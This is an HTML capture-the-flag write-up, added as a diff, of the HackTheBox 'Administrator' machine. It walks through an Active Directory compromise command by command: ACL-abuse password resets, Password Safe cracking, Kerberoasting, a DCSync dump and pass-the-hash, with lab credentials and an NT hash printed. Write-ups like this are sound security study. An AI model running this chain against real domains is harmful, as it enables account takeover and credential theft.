@@ -1,0 +1,251 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Administrator</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+
+</div>
+
+<!-- -->
+<h1>Administrator (HTB – Medium)</h1>
+
+<p>
+This machine provides an initial user credential (Olivia) and requires several Active Directory techniques:
+enumeration, password resets through ACL abuse, FTP access, password‑safe cracking, Kerberoasting, and finally
+a DCSync attack to obtain the Administrator hash.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: 10.10.11.42  
+<br>Initial access: Olivia (provided by HTB)  
+<br>Domain: administrator.htb  
+<br>Goal: escalate through multiple users until DCSync is possible.
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Initial credential:</p>
+<pre>
+Olivia : ichliebedich
+</pre>
+
+<p>Enumerating users:</p>
+<pre>
+$ enum4linux-ng -u Olivia -p 'ichliebedich' 10.10.11.42
+Users found: olivia, michael, benjamin, emily, ethan, alexander, emma, administrator
+</pre>
+
+<p>LDAP enumeration:</p>
+<pre>
+$ nxc ldap 10.10.11.42 -u users.txt -p 'ichliebedich' --users
+</pre>
+
+<p>WinRM check:</p>
+<pre>
+$ nxc winrm 10.10.11.42 -u olivia -p 'ichliebedich' -X 'ipconfig'
+-> Works
+</pre>
+
+<p>BloodHound collection:</p>
+<pre>
+$ nxc ldap 10.10.11.42 -u olivia -p 'ichliebedich' --bloodhound --collection ALL --dns-server 10.10.11.42
+-> Output saved to bloodhound.zip
+</pre>
+
+<p>BloodHound was used to inspect privilege relations between users.</p>
+
+<h2>Foothold</h2>
+
+<pre>
+$ evil-winrm -i 10.10.11.42 -u olivia -p 'ichliebedich'
+</pre>
+
+<p>
+Nothing useful in Olivia’s profile. BloodHound shows that Olivia can reset Michael’s password.
+</p>
+
+<h2>Privilege Escalation Path</h2>
+
+<h3>1. Olivia → Michael</h3>
+<pre>
+PS> Set-ADAccountPassword -Identity "Michael" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)
+</pre>
+
+<h3>2. Michael → Benjamin</h3>
+<pre>
+PS> Set-ADAccountPassword -Identity "Benjamin" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)
+</pre>
+
+<h3>3. Benjamin → FTP Access</h3>
+
+<p>Benjamin can authenticate to FTP using the new password.</p>
+
+<pre>
+$ ftp 10.10.11.42
+User: benjamin
+Pass: NewPassword123!
+Files:
+Backup.psafe3
+</pre>
+
+<h2>Password Safe Cracking</h2>
+
+<p>Crack the Password Safe file:</p>
+<pre>
+$ pwsafe2john Backup.psafe3 > Backup.psafe3.john
+$ john Backup.psafe3.john -w=/usr/share/wordlists/rockyou.txt
+-> tekieromucho
+</pre>
+
+<p>
+Open the file to retrieve stored credentials:
+</p>
+
+<pre>
+emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+</pre>
+
+<h2>Emily Access</h2>
+
+<pre>
+$ evil-winrm -i 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+-> user.txt
+</pre>
+
+<p>
+BloodHound shows Emily has <b>GenericWrite</b> over Ethan.  
+This allows Kerberoasting or SPN manipulation.
+</p>
+
+<h2>Kerberoasting Ethan</h2>
+
+<p>Clock skew fix (if needed):</p>
+<pre>
+# as root
+$ ntpdate 10.10.11.42
+</pre>
+
+<p>Request SPN ticket:</p>
+<pre>
+$ impacket-GetUserSPNs administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -dc-ip 10.10.11.42 -request
+-> Hash saved
+</pre>
+
+<p>Crack the hash:</p>
+<pre>
+$ hashcat -a 0 -m 13100 kerberoast-hash.txt -O /usr/share/wordlists/rockyou.txt -o cracked.txt
+-> ethan : limpbizkit
+</pre>
+
+<h2>Ethan Access</h2>
+
+<pre>
+$ nxc smb 10.10.11.42 -u ethan -p 'limpbizkit'
+-> Valid credentials
+</pre>
+
+<p>
+BloodHound shows Ethan has DCSync privileges.
+</p>
+
+<h2>DCSync Attack</h2>
+
+<pre>
+$ impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@10.10.11.42
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+</pre>
+
+<h2>Administrator Access</h2>
+
+<pre>
+$ evil-winrm -i 10.10.11.42 -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
+-> root.txt
+</pre>
+
+<h2>Conclusion</h2>
+<p>
+The machine chains several AD privilege abuses: password resets through ACL misconfigurations, credential extraction
+from a Password Safe file, Kerberoasting, and finally DCSync. The final compromise is achieved by abusing Ethan’s replication
+privileges to obtain the Administrator NT hash.
+</p>
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
